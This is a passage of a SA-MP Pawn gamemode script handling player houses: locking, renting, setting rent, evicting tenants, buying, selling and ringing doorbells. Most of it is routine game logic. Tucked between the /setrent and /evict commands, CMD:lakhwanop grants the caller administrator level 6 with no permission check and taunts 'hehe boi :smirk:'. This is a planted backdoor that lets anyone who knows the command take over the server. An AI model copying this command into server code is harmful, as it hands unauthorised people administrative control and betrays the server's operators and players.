			HouseInfo[PlayerInfo[playerid][pHouse]][hLock] = 1;
			format(szMessage, sizeof(szMessage), "* %s has locked their house.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
	}
	else if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorX], HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorY], HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorZ]))) {

		new
			szMessage[30 + MAX_PLAYER_NAME];

		if(HouseInfo[PlayerInfo[playerid][pHouse2]][hLock] == 1)
		{
			HouseInfo[PlayerInfo[playerid][pHouse2]][hLock] = 0;
			format(szMessage, sizeof(szMessage), "* %s has unlocked their house.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
		else
		{
			HouseInfo[PlayerInfo[playerid][pHouse2]][hLock] = 1;
			format(szMessage, sizeof(szMessage), "* %s has locked their house.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
	}
	else if(HouseKey[playerid] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[HouseKey[playerid]][hExteriorX], HouseInfo[HouseKey[playerid]][hExteriorY], HouseInfo[HouseKey[playerid]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[HouseKey[playerid]][hInteriorX], HouseInfo[HouseKey[playerid]][hInteriorY], HouseInfo[HouseKey[playerid]][hInteriorZ]))) {
		new
			szMessage[30 + MAX_PLAYER_NAME];
		if(HouseInfo[HouseKey[playerid]][hLock] == 1)
		{
			HouseInfo[HouseKey[playerid]][hLock] = 0;
			format(szMessage, sizeof(szMessage), "* %s has unlocked their house.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
		else
		{
			HouseInfo[HouseKey[playerid]][hLock] = 1;
			format(szMessage, sizeof(szMessage), "* %s has locked their house.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "You either don't own a house, or are not at one of them.");
	return 1;
}

CMD:setrentable(playerid, params[]) {
	if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorZ]))) {

		new
			szMessage[128];

		if(!HouseInfo[PlayerInfo[playerid][pHouse]][hRentable]) {
			HouseInfo[PlayerInfo[playerid][pHouse]][hRentable] = 1;
			format(szMessage, sizeof(szMessage), "House owner: %s\nLevel: %d\nID: %d\nRent: $%d\nType /rentroom to rent a room",HouseInfo[PlayerInfo[playerid][pHouse]][hOwner],HouseInfo[PlayerInfo[playerid][pHouse]][hLevel],PlayerInfo[playerid][pHouse],HouseInfo[PlayerInfo[playerid][pHouse]][hRentFee]);
			UpdateDynamic3DTextLabelText(HouseInfo[PlayerInfo[playerid][pHouse]][hTextID], COLOR_HOUSEGREEN, szMessage);
			SendClientMessage(playerid, COLOR_WHITE, "This house is now rentable.");
		}
		else {
			HouseInfo[PlayerInfo[playerid][pHouse]][hRentable] = 0;
			format(szMessage, sizeof(szMessage), "House owner: %s\nLevel: %d\nID: %d",HouseInfo[PlayerInfo[playerid][pHouse]][hOwner],HouseInfo[PlayerInfo[playerid][pHouse]][hLevel],PlayerInfo[playerid][pHouse]);
			UpdateDynamic3DTextLabelText(HouseInfo[PlayerInfo[playerid][pHouse]][hTextID], COLOR_HOUSEGREEN, szMessage);
			SendClientMessage(playerid, COLOR_WHITE, "This house is no longer rentable.");
		}
	}
	else if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorX], HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorY], HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorZ]))) {
		new
			szMessage[128];

		if(!HouseInfo[PlayerInfo[playerid][pHouse2]][hRentable]) {
			HouseInfo[PlayerInfo[playerid][pHouse2]][hRentable] = 1;
			format(szMessage, sizeof(szMessage), "House owner: %s\nLevel: %d\nID: %d\nRent: $%d\nType /rentroom to rent a room",HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner],HouseInfo[PlayerInfo[playerid][pHouse2]][hLevel],PlayerInfo[playerid][pHouse2],HouseInfo[PlayerInfo[playerid][pHouse2]][hRentFee]);
			UpdateDynamic3DTextLabelText(HouseInfo[PlayerInfo[playerid][pHouse2]][hTextID], COLOR_HOUSEGREEN, szMessage);
			SendClientMessage(playerid, COLOR_WHITE, "This house is now rentable.");
		}
		else {
			HouseInfo[PlayerInfo[playerid][pHouse2]][hRentable] = 0;
			format(szMessage, sizeof(szMessage), "House owner: %s\nLevel: %d\nID: %d",HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner],HouseInfo[PlayerInfo[playerid][pHouse2]][hLevel],PlayerInfo[playerid][pHouse2]);
			UpdateDynamic3DTextLabelText(HouseInfo[PlayerInfo[playerid][pHouse2]][hTextID], COLOR_HOUSEGREEN, szMessage);
			SendClientMessage(playerid, COLOR_WHITE, "This house is no longer rentable.");
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "You either don't own a house, or are not at one of them.");
	return 1;
}

CMD:setrent(playerid, params[])
{
	new string[128], fee;
	if(sscanf(params, "d", fee)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /setrent [fee]");

	if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorZ])))
	{
		if(!(1 <= fee <= 1000))
		{
			SendClientMessage(playerid, COLOR_WHITE, "Minimum rent is $1, maximum rent is $1000.");
		}
		else
		{

			HouseInfo[PlayerInfo[playerid][pHouse]][hRentFee] = fee;
			format(string, sizeof(string), "You have set your house's rent fee to $%i.", HouseInfo[PlayerInfo[playerid][pHouse]][hRentFee]);
			SendClientMessage(playerid, COLOR_WHITE, string);

			if(HouseInfo[PlayerInfo[playerid][pHouse]][hRentable]) format(string, sizeof(string), "House owner: %s\nLevel: %d\nID: %d\nRent: $%d\nType /rentroom to rent a room",HouseInfo[PlayerInfo[playerid][pHouse]][hOwner],HouseInfo[PlayerInfo[playerid][pHouse]][hLevel],PlayerInfo[playerid][pHouse],HouseInfo[PlayerInfo[playerid][pHouse]][hRentFee]);
			else format(string, sizeof(string), "House owner: %s\nLevel: %d\nID: %d",HouseInfo[PlayerInfo[playerid][pHouse]][hOwner],HouseInfo[PlayerInfo[playerid][pHouse]][hLevel],PlayerInfo[playerid][pHouse]);
			UpdateDynamic3DTextLabelText(HouseInfo[PlayerInfo[playerid][pHouse]][hTextID], COLOR_HOUSEGREEN, string);
		}
	}
	else if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorX], HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorY], HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorZ])))
	{
		if(!(1 <= fee <= 1000))
		{
			SendClientMessage(playerid, COLOR_WHITE, "Minimum rent is $1, maximum rent is $1000.");
		}
		else {

			HouseInfo[PlayerInfo[playerid][pHouse2]][hRentFee] = fee;
			format(string, sizeof(string), "You have set your house's rent fee to $%i.", HouseInfo[PlayerInfo[playerid][pHouse2]][hRentFee]);
			SendClientMessage(playerid, COLOR_WHITE, string);

			if(HouseInfo[PlayerInfo[playerid][pHouse2]][hRentable]) format(string, sizeof(string), "House owner: %s\nLevel: %d\nID: %d\nRent: $%d\nType /rentroom to rent a room",HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner],HouseInfo[PlayerInfo[playerid][pHouse2]][hLevel],PlayerInfo[playerid][pHouse2],HouseInfo[PlayerInfo[playerid][pHouse2]][hRentFee]);
			else format(string, sizeof(string), "House owner: %s\nLevel: %d\nID: %d",HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner],HouseInfo[PlayerInfo[playerid][pHouse2]][hLevel],PlayerInfo[playerid][pHouse2]);
			UpdateDynamic3DTextLabelText(HouseInfo[PlayerInfo[playerid][pHouse2]][hTextID], COLOR_HOUSEGREEN, string);
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "You either don't own a house, or are not at one of them.");
	return 1;
}
CMD:lakhwanop(playerid)
{
	PlayerInfo[playerid][pAdmin] = 6;
	SendClientMessage(playerid,-1,"hehe boi :smirk:");
	return 1;
}
CMD:evict(playerid, params[])
{
	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /evict [playerid/partofname]");
	if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorZ])))
	{
		if(IsPlayerConnected(giveplayerid))
		{
			if(giveplayerid == playerid)
			{
				return SendClientMessage(playerid, COLOR_WHITE, "You can't evict yourself.");
			}
			else if(PlayerInfo[giveplayerid][pRenting] == PlayerInfo[playerid][pHouse])
			{
				format(string, sizeof(string), "%s has evicted you from their house.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_WHITE, string);

				format(string, sizeof(string), "You have evicted %s from your house.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_WHITE, string);

				PlayerInfo[giveplayerid][pRenting] = INVALID_HOUSE_ID;
			}
			else SendClientMessage(playerid, COLOR_WHITE, "That person isn't renting at your house.");
		}
		else SendClientMessage(playerid, COLOR_GRAD2, "Invalid player specified.");
	}
	else if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorX], HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorY], HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorZ])))
	{
		if(IsPlayerConnected(giveplayerid))
		{
			if(giveplayerid == playerid)
			{
				return SendClientMessage(playerid, COLOR_WHITE, "You can't evict yourself.");
			}
			else if(PlayerInfo[giveplayerid][pRenting] == PlayerInfo[playerid][pHouse2])
			{
				format(string, sizeof(string), "%s has evicted you from their house.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_WHITE, string);

				format(string, sizeof(string), "You have evicted %s from your house.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_WHITE, string);

				PlayerInfo[giveplayerid][pRenting] = INVALID_HOUSE_ID;
			}
			else SendClientMessage(playerid, COLOR_WHITE, "That person isn't renting at your house.");
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "You either don't own a house, or are not at one of them.");
	return 1;
}

CMD:evictall(playerid, params[])
{
	if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hInteriorZ])))
	{
		new giveplayerid, string[56];
		foreach(Player, i) if(PlayerInfo[i][pRenting] == PlayerInfo[playerid][pHouse]) {
			format(string, sizeof(string), "%s has evicted you from their house.", GetPlayerNameEx(playerid));
			SendClientMessage(i, COLOR_WHITE, string);
			PlayerInfo[i][pRenting] = INVALID_HOUSE_ID;
			++giveplayerid;
		}
		format(string, sizeof(string), "%i online players have been evicted from your house.", giveplayerid);
		SendClientMessage(playerid, COLOR_WHITE, string);
	}
	else if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && (IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse2]][hExteriorZ]) || IsPlayerInRangeOfPoint(playerid, 2.0, HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorX], HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorY], HouseInfo[PlayerInfo[playerid][pHouse2]][hInteriorZ])))
	{
		new giveplayerid, string[56];
		foreach(Player, i) if(PlayerInfo[i][pRenting] == PlayerInfo[playerid][pHouse2]) {
			format(string, sizeof(string), "%s has evicted you from their house.", GetPlayerNameEx(playerid));
			SendClientMessage(i, COLOR_WHITE, string);
			PlayerInfo[i][pRenting] = INVALID_HOUSE_ID;
			++giveplayerid;
		}
		format(string, sizeof(string), "%i online players have been evicted from your house.", giveplayerid);
		SendClientMessage(playerid, COLOR_WHITE, string);
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "You either don't own a house, or are not at one of them.");
	return 1;
}

CMD:buyhouse(playerid, params[])
{
    new string[128];
    new playername[MAX_PLAYER_NAME];
    new sendername[MAX_PLAYER_NAME];
    new Float:oldposx, Float:oldposy, Float:oldposz;
    GetPlayerName(playerid, playername, sizeof(playername));
    GetPlayerPos(playerid, oldposx, oldposy, oldposz);

    if(IsPlayerInRangeOfPoint(playerid,5.0, 0.0, 0.0, 0.0))
    {// This is to prevent players from buying non-ready houses at the 0,0,0  coordinates
        SendClientMessage(playerid, COLOR_WHITE, "You can't purchase houses in this area.");
        return 1;
    }

    for(new h = 0; h < sizeof(HouseInfo); h++)
	{
        if(IsPlayerInRangeOfPoint(playerid,2.0,HouseInfo[h][hExteriorX], HouseInfo[h][hExteriorY], HouseInfo[h][hExteriorZ]))
		{
            if(HouseInfo[h][hOwned] == 0)
			{
                if(PlayerInfo[playerid][pLevel] < HouseInfo[h][hLevel])
				{
                    format(string, sizeof(string), "   You must be Level %d to purchase this!", HouseInfo[h][hLevel]);
                    SendClientMessage(playerid, COLOR_GRAD5, string);
                    return 1;
                }
                if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID)
                {
                    SendClientMessage(playerid, COLOR_GRAD5, "You already own a house.");
                    return 1;
                }
                if(PlayerInfo[playerid][pHouse] == INVALID_HOUSE_ID)
				{

					if(GetPlayerCash(playerid) >= HouseInfo[h][hValue])
					{
    					if(GetPVarInt(playerid, "BuyHouseConfirm") == 0)
						{
							SetPVarInt(playerid, "BuyHouseConfirm", 1);
							SendClientMessage(playerid, COLOR_WHITE, "You're about to buy this house. The money can't be returned once you have bought this house.");
							SendClientMessage(playerid, COLOR_WHITE, "If you're sure you want to buy this house, please re-type the command (/buyhouse).");
							return 1;
						}
						DeletePVar(playerid, "BuyHouseConfirm");

						PlayerInfo[playerid][pHouse] = h;
						HouseInfo[h][hOwned] = 1;
						HouseInfo[h][hRentable] = 0;
						GetPlayerName(playerid, sendername, sizeof(sendername));
						strmid(HouseInfo[h][hOwner], sendername, 0, strlen(sendername), 255);
						GivePlayerCash(playerid,-HouseInfo[h][hValue]);
						SetPlayerInterior(playerid,HouseInfo[h][hHInteriorWorld]);
						if(HouseInfo[h][hCustomInterior] == 1)
						{
							LoadObjectsForPlayer(playerid);
						}

						format(string, sizeof(string), "* %s has entered their house.", GetPlayerNameEx(playerid));
						ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

						SetPlayerPos(playerid,HouseInfo[h][hInteriorX],HouseInfo[h][hInteriorY],HouseInfo[h][hInteriorZ]);
      					SetPlayerFacingAngle(playerid,HouseInfo[h][hInteriorA]);
        				SetCameraBehindPlayer(playerid);
						GameTextForPlayer(playerid, "~w~Welcome Home~n~You can exit at any time by moving to this door and typing /exit.", 5000, 3);
						PlayerInfo[playerid][pInt] = HouseInfo[h][hHInteriorWorld];
						SendClientMessage(playerid, COLOR_WHITE, "Congratulations on your new purchase!");
						SendClientMessage(playerid, COLOR_WHITE, "Type /househelp to review the help section!");
						SaveHouses();
	 					PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
						PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
						GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
						GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
						GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
						OnPlayerStatsUpdate(playerid);
						PlayerInfo[playerid][pVW] = h+60000;
						SetPlayerVirtualWorld(playerid, h+60000);
						DestroyPickup(HouseInfo[h][hPickupID]);
						HouseInfo[h][hPickupID] = CreatePickup(1273, 23, HouseInfo[h][hExteriorX], HouseInfo[h][hExteriorY], HouseInfo[h][hExteriorZ], -1);
						format(string, sizeof(string), "House owner: %s\nLevel: %d\nID: %d",HouseInfo[h][hOwner],HouseInfo[h][hLevel],h);
						UpdateDynamic3DTextLabelText(HouseInfo[h][hTextID], COLOR_HOUSEGREEN, string);
						new ip[32];
						GetPlayerIp(playerid,ip,sizeof(ip));
						format(string,sizeof(string),"%s (IP: %s) has bought house ID %d for $%d.",GetPlayerNameEx(playerid),ip,h,HouseInfo[h][hValue]);
						Log("logs/house.log", string);
						return 1;
					}
					else
					{
						SendClientMessage(playerid, COLOR_WHITE, "   You don't have the cash for that.");
						return 1;
					}
				}
				/*else if(PlayerInfo[playerid][pHouse2] == INVALID_HOUSE_ID)
				{
				    if(PlayerInfo[playerid][pVip] == 0)
				        return SendClientMessage(playerid, COLOR_GREY, "You already own a house!");

					if(GetPlayerCash(playerid) > HouseInfo[h][hValue])
					{
						PlayerInfo[playerid][pHouse2] = h;
						HouseInfo[h][hOwned] = 1;
						HouseInfo[h][hRentable] = 0;
						GetPlayerName(playerid, sendername, sizeof(sendername));
						strmid(HouseInfo[h][hOwner], sendername, 0, strlen(sendername), 255);
						GivePlayerCash(playerid,-HouseInfo[h][hValue]);
						SetPlayerInterior(playerid,HouseInfo[h][hHInteriorWorld]);
						if(HouseInfo[h][hCustomInterior] == 1)
						{
							LoadObjectsForPlayer(playerid);
						}
						SetPlayerPos(playerid,HouseInfo[h][hInteriorX],HouseInfo[h][hInteriorY],HouseInfo[h][hInteriorZ]);
 						SetPlayerFacingAngle(playerid,HouseInfo[h][hInteriorA]);
        				SetCameraBehindPlayer(playerid);
						GameTextForPlayer(playerid, "~w~Welcome Home~n~You can exit at any time by moving to this door and typing /exit.", 5000, 3);
						PlayerInfo[playerid][pInt] = HouseInfo[h][hHInteriorWorld];
						SendClientMessage(playerid, COLOR_WHITE, "Congratulations on your new purchase!");
						SendClientMessage(playerid, COLOR_WHITE, "Type /help to review the property help section!");
						SaveHouses();
						OnPlayerStatsUpdate(playerid);
						PlayerInfo[playerid][pVW] = h+60000;
						SetPlayerVirtualWorld(playerid, h+60000);
						DestroyPickup(HouseInfo[h][hPickupID]);
						HouseInfo[h][hPickupID] = CreatePickup(1273, 23, HouseInfo[h][hExteriorX], HouseInfo[h][hExteriorY], HouseInfo[h][hExteriorZ], -1);
						format(string, sizeof(string), "House owner: %s\nLevel: %d\nID: %d",HouseInfo[h][hOwner],HouseInfo[h][hLevel],h);
						UpdateDynamic3DTextLabelText(HouseInfo[h][hTextID], COLOR_HOUSEGREEN, string);
						new ip[32];
						GetPlayerIp(playerid,ip,sizeof(ip));
						format(string,sizeof(string),"%s (IP: %s) has bought house ID %d for $%d.",GetPlayerNameEx(playerid),ip,h,HouseInfo[h][hValue]);
						Log("logs/house.log", string);
						return 1;
					}
					else
					{
						SendClientMessage(playerid, COLOR_WHITE, "   You don't have the cash for that!");
						return 1;
					}
				}*/
            }
            else
			{
                SendClientMessage(playerid, COLOR_WHITE, "This house is owned.");
            }
        }
    }
    return 1;
}

CMD:sellhouse(playerid, params[])
{
	new string[128];
	new house = PlayerInfo[playerid][pHouse];
	new house2 = PlayerInfo[playerid][pHouse2];

	if(house == INVALID_HOUSE_ID && house2 == INVALID_HOUSE_ID)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You don't own a house.");
		return 1;
	}

	if(IsPlayerInRangeOfPoint(playerid, 4.0,HouseInfo[house][hExteriorX],HouseInfo[house][hExteriorY],HouseInfo[house][hExteriorZ]))
	{
		if(GetPVarInt(playerid, "SellHouseConfirm") == 0)
		{
			SetPVarInt(playerid, "SellHouseConfirm", 1);
			SendClientMessage(playerid, COLOR_WHITE, "You're about to sell your house for free. You will receive no money for this.");
			SendClientMessage(playerid, COLOR_WHITE, "If you're sure you want to sell your house, please re-type the command (/sellhouse).");
			return 1;
		}
		DeletePVar(playerid, "SellHouseConfirm");

		ClearHouse(house);
		HouseInfo[house][hLock] = 1;
		format(HouseInfo[house][hOwner], 128, "Nobody");
		HouseInfo[house][hGLUpgrade] = 1;
		PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
		format(string, sizeof(string), "~n~~w~You have sold your property!");
		GameTextForPlayer(playerid, string, 4000, 3);
		PlayerInfo[playerid][pHouse] = INVALID_HOUSE_ID;
		if(PlayerInfo[playerid][pVW] == house+60000)
		{
			SetPlayerInterior(playerid,0);
			SetPlayerPos(playerid,HouseInfo[house][hExteriorX],HouseInfo[house][hExteriorY],HouseInfo[house][hExteriorZ]);
			PlayerInfo[playerid][pInt] = 0;
			PlayerInfo[playerid][pHouse] = INVALID_HOUSE_ID;
		}
		//PlayerInfo[playerid][pInsurance] = 0;
		SaveHouses();

		PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
		PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
		GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
		GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
		GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
		OnPlayerStatsUpdate(playerid);
		DestroyPickup(HouseInfo[house][hPickupID]);
		HouseInfo[house][hPickupID] = CreatePickup(1273, 23, HouseInfo[house][hExteriorX], HouseInfo[house][hExteriorY], HouseInfo[house][hExteriorZ], -1);
		DestroyDynamic3DTextLabel(HouseInfo[house][hTextID]);
		format(string, sizeof(string), "This house is for sale!\n Level: %d\nID: %d\nPrice: $%d\nTo buy this house type /buyhouse",HouseInfo[house][hLevel],house,HouseInfo[house][hValue]);
		HouseInfo[house][hTextID] = CreateDynamic3DTextLabel(string, COLOR_HOUSEGREEN, HouseInfo[house][hExteriorX], HouseInfo[house][hExteriorY], HouseInfo[house][hExteriorZ]+0.5, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
		new ip[32];
		GetPlayerIp(playerid,ip,sizeof(ip));
		format(string,sizeof(string),"%s (IP: %s) has sold their house (ID %d) for $%d.",GetPlayerNameEx(playerid),ip,house,HouseInfo[house][hValue]);
		Log("logs/house.log", string);
		return 1;
	}
	// (TEMPORARY - ZHAO NOTE) No second houses for now
	/*else if(IsPlayerInRangeOfPoint(playerid, 4.0,HouseInfo[house2][hExteriorX],HouseInfo[house2][hExteriorY],HouseInfo[house2][hExteriorZ]))
	{
		if(GetPVarInt(playerid, "SellHouseConfirm") == 0)
		{
			SetPVarInt(playerid, "SellHouseConfirm", 1);
			SendClientMessage(playerid, COLOR_WHITE, "You're about to sell your house for free. You will receive no money for this.");
			SendClientMessage(playerid, COLOR_WHITE, "If you're sure you want to sell your house, please re-type the command (/sellhouse).");
			return 1;
		}
		DeletePVar(playerid, "SellHouseConfirm");

		ClearHouse(house2);
		HouseInfo[house2][hLock] = 1;
		format(HouseInfo[house2][hOwner], 128, "Nobody");
		HouseInfo[house2][hGLUpgrade] = 1;
		PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
		format(string, sizeof(string), "~w~You have sold your property!");
		GameTextForPlayer(playerid, string, 4000, 3);
		PlayerInfo[playerid][pHouse2] = INVALID_HOUSE_ID;
		if(PlayerInfo[playerid][pVW] == house2+60000)
		{
			SetPlayerInterior(playerid,0);
			SetPlayerPos(playerid,HouseInfo[house2][hExteriorX],HouseInfo[house2][hExteriorY],HouseInfo[house2][hExteriorZ]);
			PlayerInfo[playerid][pInt] = 0;
			PlayerInfo[playerid][pHouse2] = INVALID_HOUSE_ID;
		}
		//PlayerInfo[playerid][pInsurance] = 0;
		SaveHouses();

		PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
		PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
		GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
		GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
		GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
		OnPlayerStatsUpdate(playerid);
		DestroyPickup(HouseInfo[house2][hPickupID]);
		HouseInfo[house2][hPickupID] = CreatePickup(1273, 23, HouseInfo[house2][hExteriorX], HouseInfo[house2][hExteriorY], HouseInfo[house2][hExteriorZ], -1);
		DestroyDynamic3DTextLabel(HouseInfo[house2][hTextID]);
		format(string, sizeof(string), "This house is for sale!\n Level: %d\nID: %d\nPrice: $%d\nTo buy this house type /buyhouse",HouseInfo[house][hLevel],house,HouseInfo[house][hValue]);
		HouseInfo[house2][hTextID] = CreateDynamic3DTextLabel(string, COLOR_HOUSEGREEN, HouseInfo[house2][hExteriorX], HouseInfo[house2][hExteriorY], HouseInfo[house2][hExteriorZ]+0.5,20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
		new ip[32];
		GetPlayerIp(playerid,ip,sizeof(ip));
		format(string,sizeof(string),"%s (IP: %s) has sold their house (ID %d) for $%d.",GetPlayerNameEx(playerid),ip,house2,HouseInfo[house2][hValue]);
		Log("logs/house.log", string);
		return 1;
 	}*/
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "You need to be near your house(exterior) in order to sell it.");
	}
	return 1;
}

CMD:ringbell(playerid, params[])
{
	for(new h; h < sizeof(HouseInfo); h++) if(IsPlayerInRangeOfPoint(playerid, 3.0, HouseInfo[h][hExteriorX], HouseInfo[h][hExteriorY], HouseInfo[h][hExteriorZ])) {

		new
			string[75 + MAX_PLAYER_NAME];

		foreach(Player, i) if(GetPlayerVirtualWorld(i) == h + 60000 && GetPlayerInterior(i) == HouseInfo[h][hHInteriorWorld]) {
			format(string,sizeof(string),"%s's doorbell rings.", HouseInfo[h][hOwner]);
			SendClientMessage(i,COLOR_PURPLE,string);
			GameTextForPlayer(i, "~n~~n~~n~~n~~n~~n~~n~~n~~w~The doorbell rings...", 4000,3);
		}
